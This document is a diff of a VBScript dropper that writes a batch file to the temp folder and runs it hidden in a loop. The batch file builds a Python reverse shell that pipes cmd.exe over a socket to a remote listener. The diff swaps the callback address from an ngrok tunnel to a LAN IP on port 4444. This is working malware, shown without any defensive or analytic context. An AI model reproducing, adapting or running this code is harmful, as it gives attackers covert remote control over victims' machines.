@@ -29,7 +29,7 @@ Do
         objFile.WriteLine "        echo def rev^(^)^:"
         objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
         objFile.WriteLine "        echo    s = socket.socket^(^)"
-        objFile.WriteLine "        echo    s.connect^(('5.tcp.eu.ngrok.io', 11550^)^)"
+        objFile.WriteLine "        echo    s.connect^(('192.168.1.16', 4444^)^)"
         objFile.WriteLine "        echo."
         objFile.WriteLine "        echo    def s_o^(^)^:"
         objFile.WriteLine "        echo        while True^:"
@@ -74,11 +74,9 @@ Do
     End If
 
     If fso.FileExists(temp & "\pro.bat") Then
-        Dim objShell
         Set objShell = CreateObject("WScript.Shell")
         objShell.Run temp & "\pro.bat", 0, False
     Else
-        Dim temp_dir
         Set objShell = CreateObject("WScript.Shell")
         temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
         objShell.CurrentDirectory = temp_dir
@@ -98,7 +96,7 @@ Do
         objFile.WriteLine "        echo def rev^(^)^:"
         objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
         objFile.WriteLine "        echo    s = socket.socket^(^)"
-        objFile.WriteLine "        echo    s.connect^(('5.tcp.eu.ngrok.io', 11550^)^)"
+        objFile.WriteLine "        echo    s.connect^(('192.168.1.16', 4444^)^)"
         objFile.WriteLine "        echo."
         objFile.WriteLine "        echo    def s_o^(^)^:"
         objFile.WriteLine "        echo        while True^:"
